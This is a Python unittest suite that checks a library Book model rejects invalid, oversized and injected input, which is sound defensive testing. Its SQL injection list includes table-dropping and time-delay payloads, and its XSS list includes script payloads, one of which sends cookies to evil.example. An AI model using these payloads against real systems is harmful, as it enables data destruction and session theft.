import contextlib
import datetime
import sys
import unittest

from project.books.models import Book

CURRENT_YEAR = datetime.date.today().year

VALID = dict(
    name="Pan Tadeusz",
    author="Adam Mickiewicz",
    year_published=1834,
    book_type="2days",
)

TEXT_FIELDS = ("name", "author", "book_type")


def make(**override):
    data = dict(VALID)
    data.update(override)
    return Book(**data)


CATEGORIES = ("TestBookValidData", "TestBookInvalidData", "TestBookSQLInjection",
              "TestBookXSS", "TestBookExtremeData")
STATS = {name: [0, 0] for name in CATEGORIES}


def tearDownModule():
    print("\n===== SUBTEST SUMMARY =====", file=sys.stderr)
    for label, (ok, fail) in STATS.items():
        print(f"{label:<22} success: {ok:>3}   fail: {fail:>3}", file=sys.stderr)


class BookTestCase(unittest.TestCase):
    def _count(self, passed):
        STATS[type(self).__name__][0 if passed else 1] += 1

    @contextlib.contextmanager
    def subTest(self, *args, **params):
        self._has_subtests = True
        with super().subTest(*args, **params):
            try:
                yield
            except Exception:
                self._count(False)
                raise
            self._count(True)

    def run(self, result=None):
        self._has_subtests = False
        before = len(result.failures) + len(result.errors)
        super().run(result)
        if not self._has_subtests:
            self._count(len(result.failures) + len(result.errors) == before)
        return result

    def assertRejected(self, field, values):
        for value in values:
            shown = value if not isinstance(value, str) or len(value) <= 60 \
                else f"<str len={len(value)}>"
            with self.subTest(field=field, value=shown):
                with self.assertRaises(Exception):
                    make(**{field: value})


# 1. Testy poprawnych danych
class TestBookValidData(BookTestCase):
    def test_correct_books_are_created(self):
        inputs = [
            ("Pan Tadeusz", "Adam Mickiewicz", 1834, "2days", "available"),
            ("Lalka", "Bolesław Prus", 1890, "5days", "loaned"),
            ("Solaris", "Stanisław Lem", 1961, "10days", "available"),
            ("Wiedźmin", "Andrzej Sapkowski", 1990, "2days", "loaned"),
            ("Clean Code", "Robert C. Martin", 2008, "5days", "available"),
        ]
        for name, author, year, book_type, status in inputs:
            with self.subTest(name=name):
                book = Book(name, author, year, book_type, status)
                self.assertEqual(book.name, name)
                self.assertEqual(book.author, author)
                self.assertEqual(book.year_published, year)
                self.assertEqual(book.book_type, book_type)
                self.assertEqual(book.status, status)

    def test_keyword_arguments(self):
        book = Book(**VALID)
        for field, value in VALID.items():
            self.assertEqual(getattr(book, field), value)

    def test_default_status_is_available(self):
        self.assertEqual(make().status, "available")

    def test_all_book_types_accepted(self):
        for book_type in ("2days", "5days", "10days"):
            with self.subTest(book_type=book_type):
                self.assertEqual(make(book_type=book_type).book_type, book_type)

    def test_boundary_name_length(self):
        for name in ("A", "X" * 64):
            with self.subTest(length=len(name)):
                self.assertEqual(make(name=name).name, name)

    def test_boundary_author_length(self):
        for author in ("A", "Y" * 64):
            with self.subTest(length=len(author)):
                self.assertEqual(make(author=author).author, author)

    def test_boundary_year(self):
        for year in (1, CURRENT_YEAR):
            with self.subTest(year=year):
                self.assertEqual(make(year_published=year).year_published, year)

    def test_unicode_characters(self):
        book = make(name="Zażółć gęślą jaźń", author="Żółkiewski")
        self.assertEqual(book.name, "Zażółć gęślą jaźń")
        self.assertEqual(book.author, "Żółkiewski")

    def test_repr_contains_data(self):
        text = repr(make())
        self.assertIn("Pan Tadeusz", text)
        self.assertIn("Adam Mickiewicz", text)
        self.assertIn("1834", text)


# 2. Testy niepoprawnych danych
class TestBookInvalidData(BookTestCase):
    def test_invalid_name(self):
        self.assertRejected("name", [
            None, "", " ", "\t", "\n", "null", "nil", "0",
            "   Pan Tadeusz", "Pan\nTadeusz", "%20",
            "X" * 65, 123, 12.5, [], {}, True,
            "©@£$∞§|[]≈±´•Ωé®†µüıœπ˙~ßð¸√ç‹›‘’,…",
        ])

    def test_invalid_author(self):
        self.assertRejected("author", [
            None, "", " ", "\t", "\n", "null", "12345", "%20", "--",
            "A d a m  M i c k i e w i c z", "Y" * 65, 42, [], {},
        ])

    def test_invalid_year_published(self):
        self.assertRejected("year_published", [
            None, "", "abc", "2000", "1834.0", -1, 0, CURRENT_YEAR + 1,
            3000, 2000.5, float("nan"), float("inf"), True, [], {},
        ])

    def test_invalid_book_type(self):
        self.assertRejected("book_type", [
            None, "", " ", "1day", "2DAYS", "2 days", "abc", "30days", 2, "X" * 21,
        ])

    def test_invalid_status(self):
        self.assertRejected("status", [
            None, "", " ", "stolen", "AVAILABLE", "lost", 1, "X" * 21,
        ])


# 3. Testy prób wstrzyknięcia kodu SQL (SQLi)
SQL_INJECTIONS = [
    "-- or # ",
    "\" OR 1 = 1 -- -",
    "'''''''''''''UNION SELECT '2",
    "1' ORDER BY 1--+",
    "' UNION SELECT sum(columnname ) from tablename --",
    ",(select * from (select(sleep(10)))a)",
    "'; DROP TABLE books; --",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1; DELETE FROM customers; --",
]


class TestBookSQLInjection(BookTestCase):
    def test_sql_injection_name(self):
        self.assertRejected("name", SQL_INJECTIONS)

    def test_sql_injection_author(self):
        self.assertRejected("author", SQL_INJECTIONS)

    def test_sql_injection_book_type(self):
        self.assertRejected("book_type", SQL_INJECTIONS)

    def test_sql_injection_status(self):
        self.assertRejected("status", SQL_INJECTIONS)


# 4. Testy prób wstrzyknięcia kodu JavaScript (XSS)
XSS_INJECTIONS = [
    "\"-prompt(8)-\"",
    "'-prompt(8)-'",
    "<img/src/onerror=prompt(8)>",
    "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
    "'`\"><\\x3Cscript>javascript:alert(1)</script>",
    "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
    "<svg onload=alert(1)>",
    "<script>document.location='http://evil.example/?c='+document.cookie</script>",
    "javascript:alert(document.domain)",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
]


class TestBookXSS(BookTestCase):
    def test_xss_name(self):
        self.assertRejected("name", XSS_INJECTIONS)

    def test_xss_author(self):
        self.assertRejected("author", XSS_INJECTIONS)

    def test_xss_book_type(self):
        self.assertRejected("book_type", XSS_INJECTIONS)

    def test_xss_status(self):
        self.assertRejected("status", XSS_INJECTIONS)


# 5. Testy ekstremalne
EXTREME_LENGTHS = (10_000, 100_000, 1_000_000, 2_000_000, 4_000_000)


class TestBookExtremeData(BookTestCase):
    def test_extreme_name(self):
        self.assertRejected("name", ["X" * n for n in EXTREME_LENGTHS])

    def test_extreme_author(self):
        self.assertRejected("author", ["X" * n for n in EXTREME_LENGTHS])

    def test_extreme_book_type(self):
        self.assertRejected("book_type", ["X" * n for n in EXTREME_LENGTHS])

    def test_extreme_year_published(self):
        self.assertRejected("year_published", [
            10 ** 100, -(10 ** 100), 2 ** 63, -(2 ** 63) - 1, 10 ** 18,
        ])


if __name__ == "__main__":
    unittest.main()
